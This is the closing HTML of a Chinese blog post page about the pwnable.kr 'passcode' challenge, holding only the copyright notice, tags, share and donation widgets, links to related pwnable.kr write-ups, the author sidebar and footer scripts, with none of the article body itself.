+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:hskull@foxmail.com">hskull</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/">http://example.com/2021/08/11/pwnable.kr系列05-passcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="http://hskull.cn/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">少卿の博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/linux-pwnable-kr/">linux - pwnable.kr</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9704-flag/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">pwnable.kr系列刷题之04-flag</div></div></a></div><div class="next-post pull-right"><a href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9703-bof/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">pwnable.kr系列刷题之03-bof</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/08/11/pwnable.kr系列02-collision/" title="pwnable.kr系列刷题之02-collision"><img class="cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">pwnable.kr系列刷题之02-collision</div></div></a></div><div><a href="/2021/08/11/pwnable.kr系列01-fd/" title="pwnable.kr系列刷题之01-fd"><img class="cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">pwnable.kr系列刷题之01-fd</div></div></a></div><div><a href="/2021/08/11/pwnable.kr系列04-flag/" title="pwnable.kr系列刷题之04-flag"><img class="cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">pwnable.kr系列刷题之04-flag</div></div></a></div><div><a href="/2021/08/11/pwnable.kr系列03-bof/" title="pwnable.kr系列刷题之03-bof"><img class="cover" src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">pwnable.kr系列刷题之03-bof</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20201231224217.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">hskull</div><div class="author-info__description">格物致知 诚意正心 修身齐家</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hskull00"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，我将带你走进网络安全的世界</div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9702-collision/" title="pwnable.kr系列刷题之02-collision"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之02-collision"/></a><div class="content"><a class="title" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9702-collision/" title="pwnable.kr系列刷题之02-collision">pwnable.kr系列刷题之02-collision</a><time datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9701-fd/" title="pwnable.kr系列刷题之01-fd"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之01-fd"/></a><div class="content"><a class="title" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9701-fd/" title="pwnable.kr系列刷题之01-fd">pwnable.kr系列刷题之01-fd</a><time datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9704-flag/" title="pwnable.kr系列刷题之04-flag"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之04-flag"/></a><div class="content"><a class="title" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9704-flag/" title="pwnable.kr系列刷题之04-flag">pwnable.kr系列刷题之04-flag</a><time datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/" title="pwnable.kr系列刷题之05-passcode"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之05-passcode"/></a><div class="content"><a class="title" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/" title="pwnable.kr系列刷题之05-passcode">pwnable.kr系列刷题之05-passcode</a><time datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9703-bof/" title="pwnable.kr系列刷题之03-bof"><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwnable.kr系列刷题之03-bof"/></a><div class="content"><a class="title" href="/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9703-bof/" title="pwnable.kr系列刷题之03-bof">pwnable.kr系列刷题之03-bof</a><time datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By hskull</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
